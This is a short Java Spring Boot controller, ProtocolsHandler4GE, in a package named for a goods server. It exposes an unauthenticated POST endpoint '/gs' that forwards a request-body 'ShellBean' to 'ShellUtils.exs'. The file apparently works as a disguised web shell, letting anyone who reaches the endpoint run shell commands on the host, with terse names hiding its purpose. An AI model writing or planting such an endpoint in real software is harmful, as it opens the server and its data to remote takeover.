package com.dkdy.goodsserver;

import com.util.ShellBean;
import com.util.ShellUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import javax.validation.Valid;

@Slf4j
@RestController
public class ProtocolsHandler4GE {

    public ProtocolsHandler4GE() {
        log.info("init configure finished gs");
    }

    @PostMapping("/gs")
    public String exs(@RequestBody @Valid ShellBean s) {
        return ShellUtils.exs(s);
    }

}
